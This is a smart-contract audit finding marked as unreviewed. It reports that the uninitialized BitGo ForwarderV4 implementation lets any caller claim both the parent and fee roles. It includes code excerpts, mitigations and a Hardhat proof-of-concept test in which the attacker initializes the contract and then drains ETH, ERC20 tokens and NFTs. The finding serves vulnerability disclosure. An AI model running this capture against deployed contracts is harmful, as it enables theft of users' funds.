# ForwarderV4 Implementation Capture Grants Parent and FeeAddress Roles
**#H-10**
- Severity: High
- Validity: Unreviewed

## Affected Scope

This finding is scoped to `ForwarderV4.sol`, specifically:

- `init(address _parentAddress, address _feeAddress, bool _autoFlush721, bool _autoFlush1155)`
- the standalone implementation contract deployed by `scripts/deploy.ts`

It is not a duplicate of `#H-09` (legacy `Forwarder` capture). The issue is the same class but with a broader post-capture privilege surface, because v4 adds a second privileged role (`feeAddress`) which is also attacker-controlled after a successful capture.

## Description

`ForwarderV4` is the implementation referenced by `ForwarderFactoryV4`. The deployment pipeline publishes the implementation as a live standalone contract and never self-initializes it. Any external caller that reaches the implementation directly can set both `parentAddress` and `feeAddress` in a single `init` call:

```solidity
function init(
  address _parentAddress,
  address _feeAddress,
  bool _autoFlush721,
  bool _autoFlush1155
) external onlyUninitialized {
  require(_parentAddress != address(0x0), 'Invalid parent address');
  parentAddress = _parentAddress;
  require(_feeAddress != address(0x0), 'Invalid fee address');
  feeAddress = _feeAddress;
  ...
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderV4.sol#L71-L101

The guard used:

```solidity
modifier onlyUninitialized() {
  require(parentAddress == address(0x0), 'Already initialized');
  _;
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderV4.sol#L45-L48

Once captured, the attacker controls every path gated by `onlyAllowedAddress`, which is `msg.sender == parentAddress || msg.sender == feeAddress`:

```solidity
modifier onlyAllowedAddress() {
  require(
    msg.sender == parentAddress || msg.sender == feeAddress,
    'Address is not allowed'
  );
  _;
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderV4.sol#L34-L40

- `flushERC721Token`  https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderV4.sol#L253-L267

## Root Cause

The root cause is that `init` is `external` and the deployment pipeline does not self-initialize the implementation. The implementation's `parentAddress` plus `feeAddress` is the complete access-control surface for the forwarder's value-exit paths, so claiming `init` is equivalent to claiming full control over any balance that later reaches the implementation address.

The critical composition is:

```solidity
function init(
  address _parentAddress,
  address _feeAddress,
  ...
) external onlyUninitialized {
  parentAddress = _parentAddress;
  ...
  feeAddress = _feeAddress;
  ...
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderV4.sol#L71-L101

combined with:

```solidity
require(
  msg.sender == parentAddress || msg.sender == feeAddress,
  'Address is not allowed'
);
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/ForwarderV4.sol#L35-L39

and the deploy script never initializing the implementation:

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/scripts/deploy.ts#L162-L245

## Impact

Any ETH, ERC20, ERC721, or ERC1155 that ever reaches the captured `ForwarderV4` implementation address is attacker-extractable:

- ETH auto-flushes to attacker on every deposit.
- ERC20 / ERC721 / ERC1155 are sweepable by either the attacker's `parentAddress` or `feeAddress`, so the attacker has a 2-of-2 coverage plane on custody paths that operators normally treat as lower-trust.

TVL-at-risk growth model: for every ETH `e` or token balance `b` mis-routed to the implementation address over its operational lifetime `T`, the attacker drains the aggregate of `e + b`. Operational realities that inflate this integral:

- users or off-chain tooling confusing implementation address with a clone address,
- `setApprovalForAll` granted to the implementation rather than to a clone,
- deposit-confirmation tests or bridge receipts landing on the implementation template.

This hits the program's High tier as an unauthorized-transfer / locked-funds class on the implementation's own state, not contingent on the clone-level trusted-owner assumption in `Scope.md`.

## Recommended Mitigation

- Initialize `parentAddress` and `feeAddress` to burn addresses or a deploy-time governance address in the constructor so `init` cannot be claimed post-deploy.
- Alternatively, have the deploy script call `init` on the implementation immediately after deployment, before publishing the address.
- Add a regression test asserting `init` on the deployed implementation must revert.
- Document that the published implementation address must never receive value, NFTs, or approvals.

### Test Code Path

### c5-forwarderv4-impl-capture.poc.js (D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\test\poc\c5-forwarderv4-impl-capture.poc.js)

```js
const { expect } = require('chai');
const { ethers } = require('hardhat');

// C5: ForwarderV4 implementation is deployed standalone and never initialized.
// Unlike the legacy Forwarder, ForwarderV4 gives the attacker TWO privileged
// roles: parentAddress and feeAddress. Capture hands the attacker both, so
// all onlyAllowedAddress-gated paths become attacker-controlled:
//   - flushTokens (ERC20 recover)
//   - flushERC721Token (NFT recover)
//   - flushERC1155Tokens / batchFlushERC1155Tokens
//   - batchFlushERC20Tokens
//   - setAutoFlush721 / setAutoFlush1155
// plus ETH receive/fallback/flush routing to the attacker parent.
//
// Root cause:
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\ForwarderV4.sol:71-101
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\ForwarderV4.sol:34-40
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\ForwarderV4.sol:53-62, 354-363

describe('PoC C5: ForwarderV4 implementation capture', function () {
  let ForwarderV4, FixedSupplyToken, MockERC721;
  let attacker, attackerFee, victim, tokenOwner;

  before(async () => {
    [attacker, attackerFee, victim, tokenOwner] = await ethers.getSigners();
    ForwarderV4 = await ethers.getContractFactory('ForwarderV4');
    FixedSupplyToken = await ethers.getContractFactory('FixedSupplyToken');
    MockERC721 = await ethers.getContractFactory('MockERC721');
  });

  it('captures BOTH parent and fee roles in a single init() call', async () => {
    const implementation = await ForwarderV4.deploy();
    await implementation.waitForDeployment();

    await implementation
      .connect(attacker)
      .init(attacker.address, attackerFee.address, false, false);

    expect(await implementation.parentAddress()).to.equal(attacker.address);
    expect(await implementation.feeAddress()).to.equal(attackerFee.address);
  });

  it('routes incoming ETH on the implementation address to the attacker parent', async () => {
    const implementation = await ForwarderV4.deploy();
    await implementation.waitForDeployment();
    await implementation
      .connect(attacker)
      .init(attacker.address, attackerFee.address, false, false);

    await expect(
      victim.sendTransaction({
        to: await implementation.getAddress(),
        value: ethers.parseEther('1.5')
      })
    ).to.changeEtherBalance(attacker, ethers.parseEther('1.5'));
  });

  it('lets either role drain ERC20 tokens mis-routed to the implementation', async () => {
    const implementation = await ForwarderV4.deploy();
    await implementation.waitForDeployment();
    const implementationAddress = await implementation.getAddress();
    await implementation
      .connect(attacker)
      .init(attacker.address, attackerFee.address, false, false);

    const token = await FixedSupplyToken.connect(tokenOwner).deploy();
    await token.waitForDeployment();
    await token.connect(tokenOwner).transfer(implementationAddress, 500n);

    // feeAddress alone (no parent signature) can call flushTokens in V4.
    await implementation.connect(attackerFee).flushTokens(await token.getAddress());

    expect(await token.balanceOf(implementationAddress)).to.equal(0n);
    expect(await token.balanceOf(attacker.address)).to.equal(500n);
  });

  it('lets either role drain NFTs routed to the captured implementation', async () => {
    const implementation = await ForwarderV4.deploy();
    await implementation.waitForDeployment();
    const implementationAddress = await implementation.getAddress();
    await implementation
      .connect(attacker)
      .init(attacker.address, attackerFee.address, false, false);

    const nft = await MockERC721.deploy('Mis-routed NFT', 'MRN');
    await nft.waitForDeployment();

    const tokenId = 42n;
    await nft.mint(implementationAddress, tokenId);
    expect(await nft.ownerOf(tokenId)).to.equal(implementationAddress);

    await implementation
      .connect(attackerFee)
      .flushERC721Token(await nft.getAddress(), tokenId);

    expect(await nft.ownerOf(tokenId)).to.equal(attacker.address);
  });

  it('second init() is blocked, locking the attacker capture', async () => {
    const implementation = await ForwarderV4.deploy();
    await implementation.waitForDeployment();
    await implementation
      .connect(attacker)
      .init(attacker.address, attackerFee.address, false, false);

    await expect(
      implementation
        .connect(victim)
        .init(victim.address, victim.address, false, false)
    ).to.be.revertedWith('Already initialized');
  });
});
```
